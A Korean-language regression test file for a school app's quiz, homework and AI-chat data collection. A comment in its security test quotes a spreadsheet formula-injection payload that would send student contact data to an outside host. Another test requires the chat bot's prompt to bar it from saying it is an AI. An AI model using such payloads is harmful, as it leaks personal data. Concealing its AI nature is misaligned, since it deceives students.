// tests/수집.test.js — [v9.138] 학습 데이터 수집층 회귀 테스트
// 실행: node tests/수집.test.js  (CI: syntax-check.yml이 tests/*.test.js 전체 구동)
//
// 이 테스트가 지키는 것 = **소급이 불가능한 것들**.
//   코드 결함은 고치면 되고 데이터는 다시 계산하면 되지만, 그날 학생이 무엇을 골랐는지는
//   받아두지 않으면 영원히 없다. 「2년 축적 → AI 회화 앱」 계획에서 여기가 무너지면
//   2년 뒤에야 알게 되고, 그때는 되돌릴 방법이 없다.
//
// 특히 채점기는 **실제 문항 전수로 성능을 잰다**(표본이 아니라 전수) — "잘 될 것"이라는 추정 대신
//   지금 몇 %를 판정할 수 있는지 숫자로 남긴다. 판정 못 하는 문항이 늘면 이 테스트가 먼저 운다.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const { ROOT, engineSource } = require('./_engine-source');
/* 줄바꿈 정규화 — git이 체크아웃 시 CRLF로 바꾸는 환경(Windows)에서 '\n}\n' 같은 표식이 통째로 안 잡힌다.
 * 08-03 실측: 리베이스 직후 이 파일의 9건이 「섹션 끝 표식을 찾지 못함」으로 한꺼번에 죽었다 —
 * 코드는 멀쩡한데 테스트만 죽는 형태라, 원인을 모르면 진짜 결함을 찾아 헤매게 된다. */
const code = engineSource().replace(/\r\n/g, '\n');

function section(startMarker, endMarker) {
  const s = code.indexOf(startMarker);
  assert.notEqual(s, -1, `섹션 시작 표식을 찾지 못함: ${startMarker}`);
  const e = code.indexOf(endMarker, s + startMarker.length);
  assert.notEqual(e, -1, `섹션 끝 표식을 찾지 못함: ${endMarker}`);
  return code.slice(s, e);
}

/* 채점 3종을 실값으로 로드 — 순수 함수라 시트 없이 그대로 돌릴 수 있다(문자열 검사보다 강한 증거). */
function loadGrader() {
  const s = code.indexOf('function quizNorm_(');
  const e = code.indexOf('/* [v9.138] 🧠 오늘의 퀴즈 응답 폼');
  assert.notEqual(s, -1, 'quizNorm_ 정의를 찾지 못함');
  assert.notEqual(e, -1, '채점 구역 끝 표식을 찾지 못함');
  return new Function(`${code.slice(s, e)}
    return { quizNorm_, quizAnswerKeys_, quizGrade_ };`)();
}

/* 라이브에 실제로 심기는 퀴즈 문항 전수 — setupQuiz의 replaceContentType 배열이 정본이다.
 * 테스트가 자기 픽스처를 들고 있으면 문항이 개정될 때 함께 늙는다(정본을 읽어야 같이 움직인다). */
function loadQuizBank() {
  const marker = "replaceContentType(ss, 'quiz', [";
  const s = code.indexOf(marker);
  assert.notEqual(s, -1, 'quiz 문항 뱅크를 찾지 못함');
  const e = code.indexOf('\n  ]);', s);
  assert.notEqual(e, -1, 'quiz 문항 뱅크 끝을 찾지 못함');
  const rows = new Function(`return ${code.slice(s + marker.length - 1, e)}\n];`)();
  return rows.filter(r => r && r[1] === 'quiz' && r[3]).map(r => {
    const parts = String(r[3]).split('|');
    return { id: r[0], cat: r[2], q: parts[0], a: parts.length > 1 ? parts.slice(1).join('|') : '' };
  });
}

const G = loadGrader();

/* ── ① 채점기 — 전수 자기일관성 ── */

test('[v9.138] 채점기는 실제 문항 전수에서 정답을 정답으로 판정한다', () => {
  const bank = loadQuizBank();
  assert.ok(bank.length >= 90, `퀴즈 문항이 ${bank.length}개뿐 — 뱅크 파싱이 깨졌다(기대 100 부근)`);
  const 판정불가 = [], 오판 = [];
  bank.forEach(item => {
    const keys = G.quizAnswerKeys_(item.a);
    if (!keys.length) { 판정불가.push(item.id); return; }
    // 정답 문자열의 핵심부를 그대로 낸 학생은 반드시 정답이어야 한다(채점기 자기일관성의 최소 조건)
    const 핵심 = String(item.a).split(/[—–]/)[0].trim();
    const g = G.quizGrade_(핵심, item.a);
    if (g.ok !== true) 오판.push(item.id + ' (정답="' + item.a + '" 핵심="' + 핵심 + '")');
  });
  assert.equal(오판.length, 0, '정답을 그대로 냈는데 오답으로 판정되는 문항: ' + 오판.join(' · '));
  // 판정 불가(정답 미등록) 문항은 있을 수 있다 — 다만 몇 개인지 **알고 있어야** 한다. 조용히 늘면 정답률 통계가 썩는다
  assert.ok(판정불가.length <= 2,
    `정답이 비어 채점 불가인 문항이 ${판정불가.length}개 — 늘었다면 문항 개정에서 정답부(|뒤)가 빠진 것: ${판정불가.join(', ')}`);
});

test('[v9.138] 채점기는 학생이 쓰는 여러 표기를 같은 답으로 본다', () => {
  // 실제 문항 QZ01 = '빈칸은? 학교( ) 가요 — ①에 ②에서' / 정답 '① 에 — 방향·도착점은 에'
  ['①', '1', '1번', '에', ' 에 ', '①에'].forEach(ans =>
    assert.equal(G.quizGrade_(ans, '① 에 — 방향·도착점은 에').ok, true, `'${ans}'가 정답으로 안 잡힌다`));
  assert.equal(G.quizGrade_('②', '① 에 — 방향·도착점은 에').ok, false, '다른 번호가 정답으로 잡힌다');
  assert.equal(G.quizGrade_('에서', '① 에 — 방향·도착점은 에').ok, false, '오답이 정답으로 잡힌다');
  // 복수 정답('의사 또는 간호사')은 어느 쪽을 써도 정답 — 한쪽만 인정하면 맞은 학생이 틀린 것으로 쌓인다
  assert.equal(G.quizGrade_('의사', '의사 또는 간호사').ok, true, '복수 정답의 앞쪽이 인정되지 않는다');
  assert.equal(G.quizGrade_('간호사', '의사 또는 간호사').ok, true, '복수 정답의 뒤쪽이 인정되지 않는다');
  // 문장부호·띄어쓰기는 오답 사유가 아니다(내용을 아는지가 관심사)
  assert.equal(G.quizGrade_('부터, 까지', '부터, 까지').ok, true, '쉼표 표기가 오답이 된다');
  assert.equal(G.quizGrade_('부터 까지', '부터, 까지').ok, true, '띄어쓰기 차이가 오답이 된다');
});

test('[v9.138] 판정 보류는 오답으로 뭉개지지 않는다 — 모르는 것과 틀린 것은 다르다', () => {
  assert.equal(G.quizGrade_('아무거나', '').ok, null, '정답 미등록인데 오답으로 판정한다(정답률 통계가 왜곡된다)');
  assert.equal(G.quizGrade_('', '작다').ok, null, '무응답을 오답으로 판정한다');
  assert.equal(G.quizGrade_('   ', '작다').ok, null, '공백 응답을 오답으로 판정한다');
  // 적재 코드가 이 3값을 그대로 문자열로 옮기는지(true/false/null → 정답/오답/판정보류)
  const sweep = section('function quizSweep_(ss)', '\n}\n');
  assert.ok(sweep.includes("g.ok === null ? '판정보류'"), '판정 보류가 시트에서 오답과 구분되지 않는다');
});

/* ── ② 수집 원칙 — 채점 실패가 데이터를 버리는 사유가 되면 안 된다 ── */

test('[v9.138] 수집이 채점보다 우선 — 채점 못 한 응답도 원문이 남는다', () => {
  const sweep = section('function quizSweep_(ss)', '\n}\n');
  // 적재 배열에 고른답(ans)이 채점 결과와 **무관하게** 들어가는지 — 조건부로 들어가면 판정불가 응답이 유실된다
  assert.ok(/out\.push\(\[[\s\S]*?셀안전_\(ans\),[\s\S]*?g\.ok === null/.test(sweep),
    '고른 답이 채점 결과보다 뒤에 조건부로 들어간다 — 판정 못 한 응답이 통째로 버려질 수 있다');
  assert.ok(!/if \(g\.ok === null\) return/.test(sweep), '판정 보류 행을 return으로 버린다(수집 원칙 위반)');
  // 문항 텍스트 스냅샷 — contents가 개정되면 ID만으로는 2년 뒤 해석이 불가능해진다
  assert.ok(sweep.includes('meta.cat') && sweep.includes('meta.q') && sweep.includes('meta.a'),
    '문항 분류·문제·정답 스냅샷이 행에 없다 — 문항 개정 후 과거 데이터가 해석 불능이 된다');
  assert.ok(sweep.includes('const meta = qMap[qid] || '), 'contents에 없는 문항(AI 개인 퀴즈)에서 스위프가 죽는다');
});

test('[v9.138] 퀴즈 스위프는 재실행 안전 — 포인터 전진·같은 문항 중복 차단·무효 sid 통보', () => {
  const sweep = section('function quizSweep_(ss)', '\n}\n');
  assert.ok(sweep.includes("props.setProperty('퀴즈폼_포인터'"), '포인터 전진이 없다 — 매 틱마다 같은 응답이 다시 쌓인다');
  assert.ok(/if \(from > last\)[\s\S]{0,120}return/.test(sweep), '포인터가 시트 끝을 넘었을 때 클램프하지 않는다(행 삭제 후 영구 정지)');
  assert.ok(sweep.includes("seen[key]"), '같은 학생·같은 문항 중복 제출 차단이 없다');
  assert.ok(sweep.includes("notifyDroppedSids_('퀴즈폼', badSid)"), '미등록 sid가 조용히 드롭된다(무통보 드롭 결함)');
  // 게이트 순서 — 유효성 검사가 적재보다 앞
  assert.ok(sweep.indexOf('valid.has(sid)') < sweep.indexOf('out.push('), '유효 학생 검사가 적재보다 뒤에 있다');
});

/* ── ③ 숙제 3단 데이터 + 오류 태그 ── */

test('[v9.138] 오류 태그는 통제 어휘 — 어휘 밖 문자열이 시트로 새지 않는다', () => {
  const s = code.indexOf('const HW_ERROR_TAGS = [');
  const e = code.indexOf('\n}', code.indexOf('function hwTagsClean_('));
  const M = new Function(`${code.slice(s, e + 2)}
    return { HW_ERROR_TAGS, hwTagsClean_ };`)();
  assert.ok(M.HW_ERROR_TAGS.length >= 20, `태그 어휘가 ${M.HW_ERROR_TAGS.length}개뿐 — 축이 너무 거칠면 "조사 오류 3만 건"밖에 안 나온다`);
  assert.ok(M.HW_ERROR_TAGS.indexOf('오류없음') !== -1, '「오류없음」이 없으면 잘 쓴 제출이 태그 없는 행과 구분되지 않는다');
  // 몽골어 화자의 실제 병목 3축이 충분히 세분화돼 있는가(조사·활용·높임)
  assert.ok(M.HW_ERROR_TAGS.filter(t => t.indexOf('조사:') === 0).length >= 5, '조사 축이 너무 거칠다 — 몽골어 화자 최대 병목이라 여기가 뭉개지면 지도가 안 된다');
  assert.ok(M.HW_ERROR_TAGS.filter(t => t.indexOf('높임:') === 0).length >= 2, '높임 축이 없다');
  // 실행 검증 — 어휘 밖·중복·빈값 처리
  assert.equal(M.hwTagsClean_(['조사:목적격(을/를)', '어미:시제']), '조사:목적격(을/를), 어미:시제');
  assert.equal(M.hwTagsClean_(['조사:목적격(을/를)', '조사:목적격(을/를)']), '조사:목적격(을/를)', '중복 태그가 그대로 쌓인다');
  assert.equal(M.hwTagsClean_(['내맘대로태그']), '', '어휘 밖 문자열이 시트에 들어간다 — 집계가 오염된다');
  assert.equal(M.hwTagsClean_([]), '', '빈 배열 처리가 없다');
  assert.equal(M.hwTagsClean_(null), '', 'null 처리가 없다(모델이 필드를 빠뜨리면 배치가 죽는다)');
  // 프롬프트가 같은 상수를 enum으로 쓰는지 — 어휘와 프롬프트가 갈라지면 모델이 못 고르는 태그가 생긴다
  const call = section('function callClaudeFeedback_(', 'const res = UrlFetchApp.fetch');
  assert.ok(call.includes('enum: HW_ERROR_TAGS'), '프롬프트 schema가 태그 어휘 정본을 쓰지 않는다');
  assert.ok(call.includes("'error_tags'"), 'error_tags가 required에 없다 — 선택 필드면 모델이 자주 생략한다');
});

test('[v9.138] 숙제 폼 증분은 멱등이고, 구 링크를 죽이지 않는다', () => {
  const fn = section('function migrateHwFormV9138()', '\n}\n');
  ['숙제ID', '재작성원본'].forEach(t =>
    assert.ok(fn.includes(`titles.indexOf('${t}') === -1`), `${t} 문항이 멱등 가드 없이 추가된다(재실행마다 중복 문항)`));
  // 필수로 만들면 이미 배포된 구 프리필 링크(그 문항이 없는)가 전부 제출 불가가 된다
  assert.ok(!/setTitle\('숙제ID'\)\.setRequired\(true\)/.test(fn), '숙제ID가 필수 응답이다 — 구 링크로 들어온 학생이 숙제를 못 낸다');
  assert.ok(!/setTitle\('재작성원본'\)\.setRequired\(true\)/.test(fn), '재작성원본이 필수 응답이다 — 최초 제출이 불가능해진다');
  // URL 틀 2종이 서로 다른 토큰을 써야 한다(같으면 한쪽이 다른 쪽을 덮어쓴다)
  assert.ok(fn.includes("prefillTemplate2_(form, '학생ID', '숙제ID', 'QZTOKEN')"), '기본 링크 틀이 없다');
  assert.ok(fn.includes("prefillTemplate2_(form, '학생ID', '재작성원본', 'REDOTOKEN')"), '다시쓰기 링크 틀이 없다');
  // 문항을 만들기 전에 틀을 뽑으면 프리필 자리가 안 잡힌다
  assert.ok(fn.indexOf("addTextItem().setTitle('재작성원본')") < fn.indexOf("setState(st, '숙제폼URL틀'"),
    'URL 틀 생성이 문항 추가보다 앞이다 — 프리필 자리가 안 잡힌 틀이 저장된다');
});

test('[v9.138] 커버리지 리포트는 총량이 아니라 빈 유형을 먼저 말한다', () => {
  const fn = section('function dataCoverageReport(', '\n}\n'); // 인자 목록은 앵커에 넣지 않는다(v9.166에서 opts가 붙어 한 번 죽었다)
  assert.ok(fn.includes('아직 한 건도 못 잡은 오류 유형'), '빈 유형 표기가 없다 — 총량만 보면 "많이 모았다"는 착시가 생긴다');
  assert.ok(/HW_ERROR_TAGS\.filter\(t => t !== '오류없음' && !태그수\[t\]\)/.test(fn), '빈칸 계산에서 「오류없음」을 빼지 않는다(영원히 안 채워지는 칸이 섞인다)');
  // 읽기 전용이어야 아무 때나 눌러도 안전하다(6개월마다 열어보는 용도)
  ['setValue', 'appendRow', 'setValues', 'insertColumns'].forEach(w =>
    assert.ok(!fn.includes(w), `커버리지 리포트가 ${w}로 시트를 쓴다 — 읽기 전용이어야 한다`));
  assert.ok(fn.includes('quiz_log') && fn.includes('hw_feedback') && fn.includes('voice_log'), '수집 3종을 모두 재지 않는다');
});

/* ── ④ AI 대화 — 회화 앱의 핵심 재료(다른 어디서도 안 나온다) ── */

test('[v9.138] 대화는 문맥을 안고 간다 — 매 턴 처음 만난 사이가 되면 그건 대화가 아니다', () => {
  const s = code.indexOf('function talkHistory_(');
  assert.notEqual(s, -1, 'talkHistory_ 정의를 찾지 못함');
  const e = code.indexOf('function callClaudeTalk_(');
  const M = new Function(`const TALK_LOG_HEADERS = ${JSON.stringify(['id', 'student_id', '턴', '학생문', 'AI답', '오류태그', '제출일', 'created_at'])};
    const TALK_CONTEXT_TURNS = 6;
    ${code.slice(s, e)}
    return { talkHistory_ };`)();
  // 두 학생의 로그가 섞여 있어도 내 대화만 문맥으로 가야 한다(남의 대화가 새면 개인정보 사고다)
  const rows = [
    ['TK1', 'S1', 1, '안녕하세요', '안녕하세요! 오늘 어땠어요?', '', '2026-08-01', ''],
    ['TK2', 'S2', 1, '다른 학생 문장', '다른 답장', '', '2026-08-01', ''],
    ['TK3', 'S1', 2, '학교에 갔어요', '재미있었어요?', '', '2026-08-02', '']
  ];
  const h = M.talkHistory_(rows, 'S1');
  assert.equal(h.length, 4, '내 턴 2개(각 user+assistant)가 문맥으로 안 돌아온다');
  assert.equal(h[0].role, 'user');
  assert.equal(h[1].role, 'assistant');
  assert.ok(!JSON.stringify(h).includes('다른 학생'), '남의 대화가 내 문맥에 섞인다 — 개인정보 유출이자 대화 붕괴');
  assert.equal(M.talkHistory_(null, 'S1').length, 0, '로그가 없을 때 죽는다(첫 턴이 영원히 불가능해진다)');
  // 답장이 빈 행(API 실패로 학생 문장만 남은 행)은 assistant 턴을 만들지 않아야 한다 — 빈 assistant는 API가 거부한다
  assert.equal(M.talkHistory_([['TK9', 'S3', 1, '학생만', '', '', '2026-08-02', '']], 'S3').length, 1,
    '답장이 빈 행에서 빈 assistant 턴이 만들어진다');
  // 문맥은 배치가 이미 읽어 둔 배열을 받아야 한다 — 학생마다 시트를 다시 읽으면 25명 배치가 전체 읽기를 25번 한다
  const batch = section('function talkBatch_()', '\n}\n');
  assert.ok(batch.includes('talkHistory_(logRows, sid)'), '대화 문맥이 학생마다 시트를 재읽기한다(반 18개 × 전체 읽기와 같은 계급)');
  assert.equal((batch.match(/tl\.getRange\(/g) || []).length, 1, `talk_log를 ${(batch.match(/tl\.getRange\(/g) || []).length}회 읽는다 — 1회여야 한다`);
});

test('[v9.138] 대화 배치 — 하루 1턴 상한·리허설 차단·실패해도 학생 문장은 남는다', () => {
  const fn = section('function talkBatch_()', '\n}\n');
  assert.ok(fn.includes("if (!apiKey) return"), 'API 키 없이도 도는 경로가 있다(배포만으로 과금될 수 있다)');
  assert.ok(/isRehearsal_\(\)[\s\S]{0,200}return/.test(fn), '리허설이 입구에서 차단되지 않는다 — 개원 시뮬이 실제 과금된다');
  // 비용은 사람 수가 아니라 열정에 비례한다 — 한 명이 밤새 눌러 그날 예산을 혼자 태우는 것을 막는다
  assert.ok(fn.includes('todayDone[sid]'), '학생당 하루 1턴 상한이 없다');
  assert.ok(fn.includes('made >= TALK_MAX_PER_RUN'), '실행당 상한이 없다');
  // 답장 생성에 실패해도 학생이 쓴 문장은 대화 데이터의 절반이다
  assert.ok(/permanent[\s\S]{0,400}tl\.appendRow\(/.test(fn), '영구 오류에서 학생 문장을 버린다(수집 원칙 위반)');
  assert.ok(fn.includes("props.setProperty('대화폼_포인터'"), '포인터 전진이 없다 — 같은 응답에 매일 밤 재과금된다');
  // 외부 발송 0 — 학생에게 가는 경로는 앱 화면뿐이어야 한다(메일·메신저로 새면 승인 없는 외부 발송이 된다)
  assert.ok(!/MailApp\.sendEmail\([^)]*sid/.test(fn), '학생에게 직접 메일을 보낸다 — 답장은 시트에만 쓴다');
  const call = section('function callClaudeTalk_(', 'const res = UrlFetchApp.fetch');
  assert.ok(call.includes('enum: HW_ERROR_TAGS'), '대화에서도 오류 태그를 같은 어휘로 받지 않는다(두 축이 갈라진다)');
  /* [v9.145] 프롬프트 제약은 이제 TALK_SYSTEM_PROMPT 상수에 산다(prompt_ver 해시가 변경을 보게 하려고 뽑았다).
   * 검사 대상을 함수 본문에 둔 채로 두면, 상수에서 제약을 지워도 테스트가 통과한다 — 가드가 눈머는 그 형태다. */
  const sysM = code.match(/const TALK_SYSTEM_PROMPT =[\s\S]*?';\n/);
  assert.ok(sysM, 'TALK_SYSTEM_PROMPT 상수를 찾지 못함');
  const sys = sysM[0];
  assert.ok(sys.includes('질문 하나로 끝'), '답장이 질문으로 끝나도록 강제하지 않는다 — 턴이 1에서 멈추면 대화 데이터가 안 쌓인다');
  assert.ok(/개인정보\(주소·전화·비밀번호\)를 묻지 않는다/.test(sys), '봇이 개인정보를 묻지 않는다는 제약이 없다');
  assert.ok(/AI·시스템 자기 언급 금지/.test(sys), '봇이 자기가 AI라고 말하지 않는다는 제약이 없다');
});

/* ── ⑤ [v9.145] 대화 출처 기록 — 「학생이 어려워한 것」과 「그때 우리 답이 나빴던 것」을 가른다 ── */

test('[v9.145] talk_log는 model·prompt_ver를 남기고, 새 열은 반드시 끝에 붙는다', () => {
  const m = code.match(/const TALK_LOG_HEADERS = (\[[^\]]*\]);/);
  assert.ok(m, 'TALK_LOG_HEADERS 정의를 찾지 못함');
  const H = JSON.parse(m[1].replace(/'/g, '"'));
  assert.ok(H.includes('model') && H.includes('prompt_ver'),
    '출처가 안 남는다 — 2년 뒤 이 대화를 무엇이 만들었는지 되돌아가 알 수 없다(소급 불가)');
  // 앞에 끼우면 r[1]·r[2]·r[3]·r[4]·r[6] 위치 접근이 통째로 밀린다(이 저장소는 열 밀림으로 여러 번 당했다)
  assert.deepEqual(H.slice(0, 8), ['id', 'student_id', '턴', '학생문', 'AI답', '오류태그', '제출일', 'created_at'],
    '기존 8열의 순서가 바뀌었다 — 위치로 읽는 코드가 전부 어긋난다');
  assert.deepEqual(H.slice(8), ['model', 'prompt_ver', 'audio_ref'], '새 열이 끝에 있지 않다'); // [v9.151] audio_ref = 음성 원본 참조(무제한 보존 · 유호 확정 08-04)
});

test('[v9.145] 성공 행과 실패 행이 **둘 다** 헤더 길이만큼 쓴다 — 하나만 고치면 열이 어긋난다', () => {
  const m = code.match(/const TALK_LOG_HEADERS = (\[[^\]]*\]);/);
  const need = JSON.parse(m[1].replace(/'/g, '"')).length;
  const fn = section('function talkBatch_()', '\n}\n');
  // 성공 경로: const row = [ ... ]  · 실패 경로: tl.appendRow([ ... ])
  const rowLit = fn.match(/const row = \[([\s\S]*?)\];/);
  assert.ok(rowLit, '성공 행 리터럴을 찾지 못함');
  const failLit = fn.match(/permanent[\s\S]*?tl\.appendRow\(\[([\s\S]*?)\]\);/);
  assert.ok(failLit, '실패 행 리터럴을 찾지 못함');
  // 최상위 콤마만 센다(중첩 호출 안의 콤마는 제외)
  const countTop = (s) => {
    let d = 0, n = 1;
    for (const ch of s) {
      if ('([{'.includes(ch)) d++;
      else if (')]}'.includes(ch)) d--;
      else if (ch === ',' && d === 0) n++;
    }
    return n;
  };
  assert.equal(countTop(rowLit[1]), need, `성공 행이 ${countTop(rowLit[1])}칸 — 헤더는 ${need}칸이다`);
  assert.equal(countTop(failLit[1]), need, `실패 행이 ${countTop(failLit[1])}칸 — 헤더는 ${need}칸이다(실패 행을 빠뜨렸다)`);
  assert.ok(/\bmodel\b/.test(rowLit[1]) && /\bpver\b/.test(rowLit[1]), '성공 행에 model·pver가 안 들어간다');
  assert.ok(/\bmodel\b/.test(failLit[1]) && /\bpver\b/.test(failLit[1]), '실패 행에 model·pver가 안 들어간다');
});

test('[v9.145] prompt_ver는 손으로 올리는 상수가 아니라 프롬프트에서 계산된다', () => {
  const fn = section('function talkPromptVer_()', '\n}\n');
  assert.ok(fn.includes('computeDigest'), 'prompt_ver가 해시가 아니다 — 손으로 관리하는 번호는 언젠가 안 올라가고, 그 순간 이 열은 거짓을 말한다');
  // 답을 바꾸는 세 가지가 전부 지문에 들어가야 한다
  assert.ok(fn.includes('TALK_SYSTEM_PROMPT'), '시스템 프롬프트가 지문에 안 들어간다');
  assert.ok(fn.includes('AI_FEEDBACK_MODEL'), '모델이 지문에 안 들어간다');
  assert.ok(fn.includes('TALK_CONTEXT_TURNS'), '문맥 턴 수가 지문에 안 들어간다(길이가 바뀌면 답도 바뀐다)');
  // 시스템 프롬프트는 상수를 참조해야 한다 — 인라인으로 되돌리면 지문이 변경을 못 본다
  const call = section('function callClaudeTalk_(', 'const res = UrlFetchApp.fetch');
  assert.ok(/system:\s*TALK_SYSTEM_PROMPT/.test(call),
    '시스템 프롬프트가 인라인이다 — 프롬프트를 고쳐도 prompt_ver가 그대로여서 데이터가 조용히 섞인다');
  // 톱레벨 계산 금지 — AI_FEEDBACK_MODEL은 Code.js에 있고 라이브 파일 로드 순서가 보장되지 않는다
  assert.ok(!/^const TALK_PROMPT_VER\s*=/m.test(code),
    'prompt_ver를 톱레벨에서 계산한다 — 로드 순서에 따라 undefined를 지문에 넣는다(v9.57 계열 사고)');
});

test('[v9.145] 이미 서 있는 시트에 새 열 이름표를 붙인다 — ensureSheet는 시트가 없을 때만 헤더를 쓴다', () => {
  const batch = section('function talkBatch_()', '\n}\n');
  assert.ok(batch.includes('talkHeaderHeal_'),
    '헤더 치유 호출이 없다 — v9.139로 이미 만들어진 8열 시트는 값만 들어가고 머리글이 없는 채로 남는다');
  const heal = section('function talkHeaderHeal_(', '\n}\n');
  assert.ok(heal.includes('getMaxColumns'), '시트 물리 열이 모자랄 때 넓히지 않는다');
  assert.ok(/return;/.test(heal), '멱등 조기 반환이 없다 — 야간 배치가 매일 헤더를 다시 쓴다');
});

test('[v9.146] 점검 함수는 「왜 안 생겼나」의 원인 넷을 전부 지목하고, 헤더 치유를 겸한다', () => {
  const fn = section('function talkLogCheck()', '\n}\n');
  // 조기 반환 4개가 전부 같은 증상(아무 일도 안 일어남)을 내므로, 넷을 구분해 주지 않으면 점검이 아니다
  assert.ok(fn.includes('CLAUDE_API_KEY'), '키 미설정을 진단하지 않는다');
  assert.ok(fn.includes('대화폼_응답'), '응답 0건(가장 흔한 원인)을 진단하지 않는다');
  assert.ok(fn.includes('대화폼_포인터'), '이미 처리된 건지(포인터)를 진단하지 않는다');
  assert.ok(fn.includes('isRehearsal_'), '리허설 차단 상태를 진단하지 않는다');
  // 배치 안쪽 치유는 조기 반환 뒤에 있어 첫 대화 전까지 안 돈다 — 여기서 불러야 지금 붙는다
  assert.ok(fn.includes('talkHeaderHeal_'), '점검이 헤더 치유를 겸하지 않는다 — 배치를 기다려야만 이름표가 붙는다');
  // 지금 쓸 값을 보여줘야 시트의 기록과 대조할 수 있다(대조 없이는 「맞는 값인지」를 모른다)
  assert.ok(fn.includes('talkPromptVer_()'), '지금 배치가 쓸 prompt_ver를 보여주지 않는다');
  assert.ok(/menuTalkLogCheck/.test(code) && /addItem\([^)]*menuTalkLogCheck|'menuTalkLogCheck'/.test(code),
    '점검이 메뉴에 배선되지 않았다 — 유호님이 부를 수단이 없으면 만든 것과 도는 것은 다르다');
});

test('[v9.138] 새 학생 열은 선점 구간을 침범하지 않는다 — 이 저장소는 열 충돌로 세 번 당했다', () => {
  const s4 = code.match(/const SHARED4_COL_START = (\d+)/);
  assert.ok(s4, '4차 블록 시작 상수가 없다');
  assert.ok(Number(s4[1]) >= 130, `4차 블록이 ${s4[1]}열에서 시작 — DT124~DX128(상담 5열)·DY129(오늘의만남) 선점 구간을 침범한다`);
  const s3 = Number(code.match(/const SHARED3_COL_START = (\d+)/)[1]);
  const h3 = code.match(/const SHARED3_COL_HEADERS = \[([\s\S]*?)\];/)[1].split(',').filter(x => x.trim()).length;
  assert.ok(s3 + h3 - 1 <= 123, `3차 블록이 ${s3 + h3 - 1}열까지 뻗어 상담 디테일(DT124)을 침범한다`);
  // 블록이 늘면 분리 쓰기도 함께 늘어야 한다 — 안 그러면 마지막 블록이 통째로 안 써지거나 앞 블록을 덮는다
  const fn = section('function writeSharedCols_(', 'const WORLD_HP_PER');
  assert.ok(fn.includes('writeIfChanged(pf, 2, SHARED4_COL_START,'), '4차 블록 분리 쓰기가 없다 — 열은 만들어지고 값은 영원히 안 채워진다');
  assert.ok(fn.includes('a.slice(cut3, cut3 + SHARED3_COL_HEADERS.length)'), '3차 블록 slice가 끝까지 열려 있다 — 4차 몫까지 3차 자리에 쏟는다');
  assert.ok(fn.includes('.concat(SHARED4_COL_HEADERS)'), 'HEADS_ALL이 4차 블록을 모른다 — 행 길이 가드가 오탐으로 전 계산을 죽인다');
});

/* ── ⑤ 보안 — 학생 입력은 「남의 글」이다 ── */

test('[v9.138] 학생이 낸 글은 셀 수식 인젝션 차단을 거쳐 시트에 들어간다', () => {
  /* 이 스프레드시트에는 profiles(학생·보호자 연락처)가 함께 있다. `=`로 시작하는 문자열을 시트가
   *   **수식으로 실행**하므로, 학생이 답 칸에 `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!B2:B60))`를
   *   넣으면 개인정보가 외부로 나간다 — 사람이 셀을 클릭할 필요도 없다(시트가 스스로 평가한다).
   *   상담AI가 페이스북 텍스트를 받으며 같은 이유로 셀안전_를 도입했다(v9.137). 학생 입력도 똑같이 남의 글이다.
   *   ⚠ 모델 출력도 감싼다 — 프롬프트 인젝션으로 `=…`로 시작하는 답을 뱉게 만들 수 있다. */
  const quiz = section('function quizSweep_(ss)', '\n}\n');
  ['셀안전_(ans)', '셀안전_(qid)', '셀안전_(conf)'].forEach(g =>
    assert.ok(quiz.includes(g), `퀴즈 적재에 ${g}가 없다 — 학생 입력이 수식으로 실행될 수 있다`));
  const talk = section('function talkBatch_()', '\n}\n');
  assert.ok(talk.includes('셀안전_(text)'), '대화 적재에 학생문 방어가 없다');
  assert.ok(talk.includes("셀안전_(String(card.reply || ''))"), '대화 적재에 모델 출력 방어가 없다(프롬프트 인젝션 경로)');
  assert.equal((talk.match(/셀안전_\(text\)/g) || []).length, 2, '정상 경로와 오류 경로 중 한쪽만 방어된다');
  const fbBatch = section('function aiFeedbackBatch_()', 'function callClaudeFeedback_(');
  ['셀안전_(text)', "셀안전_(String(card.corrected || ''))", '셀안전_(hwId)', '셀안전_(reDo)'].forEach(g =>
    assert.ok(fbBatch.includes(g), `첨삭 적재에 ${g}가 없다`));
  // 방어 함수 자체가 살아 있는지 — 상담AI.js에 있고 이 파일들이 런타임에 부른다(로드 순서 무관)
  const talkSrc = fs.readFileSync(path.join(ROOT, '상담AI.js'), 'utf8');
  assert.ok(/function 셀안전_\(v\)[\s\S]{0,200}\^\[=\+\\-@/.test(talkSrc), '셀안전_ 정의가 없거나 차단 문자 집합이 바뀌었다');
});

/* ── ⑥ 배선 — 만들어만 두고 아무도 안 부르는 상태를 막는다(v9.90 ROLE_TALK 사고 계열) ── */

test('[v9.138] 퀴즈 수집이 실제로 배선돼 있다 — 시트·스위프·폼·열·경고', () => {
  assert.ok(/\['quiz_log', QUIZ_LOG_HEADERS\]/.test(code), 'quiz_log가 시트 골격 정본에 없다 — 재건·preflight가 이 시트를 모른다');
  assert.ok(code.includes("safeRun('quizSweep', function () { quizSweep_(ss); })"), 'quizSweep_가 10분 스위프에 배선되지 않았다(폼 응답이 영원히 안 옮겨진다)');
  assert.ok(code.includes("formAlreadyMade_(ss, '퀴즈폼_응답', '퀴즈폼URL틀', '퀴즈폼ID'"), '퀴즈 폼 생성이 재실행 안전 가드를 통과하지 않는다');
  assert.ok(code.includes("setState(st, '퀴즈폼URL틀', prefillTemplate2_(form, '학생ID', '퀴즈ID'))"), '퀴즈 폼 URL 틀이 두 필드 프리필로 저장되지 않는다');
  // 학생 행에 링크가 실제로 실리는지 — 열만 만들고 값을 안 넣으면 버튼이 조용히 안 뜬다(v9.61이 잡았던 그 결함)
  assert.ok(code.includes("quizFormUrlOf_(kv['퀴즈폼URL틀'], sid,"), '학생 행에 퀴즈 폼 링크가 채워지지 않는다');
  // [v9.138] 대화층도 같은 3종 배선 — 시트·배치·폼이 하나라도 빠지면 「대화 0건」 상태가 그대로 유지된다
  assert.ok(/\['talk_log', TALK_LOG_HEADERS\]/.test(code), 'talk_log가 시트 골격 정본에 없다');
  assert.ok(code.includes("safeRun('talkBatch', talkBatch_)"), 'talkBatch_가 야간 배치에 배선되지 않았다(답장이 영원히 안 만들어진다)');
  assert.ok(code.includes("formAlreadyMade_(ss, '대화폼_응답', '대화폼URL틀', '대화폼ID'"), '대화 폼 생성이 재실행 안전 가드를 통과하지 않는다');
  assert.ok(code.includes("formUrlOf(kv['대화폼URL틀'], sid)"), '학생 행에 대화 폼 링크가 채워지지 않는다');
  // preflight — 수집 입구 2종이 없으면 경고해야 한다(조용히 0건인 상태가 가장 위험하다)
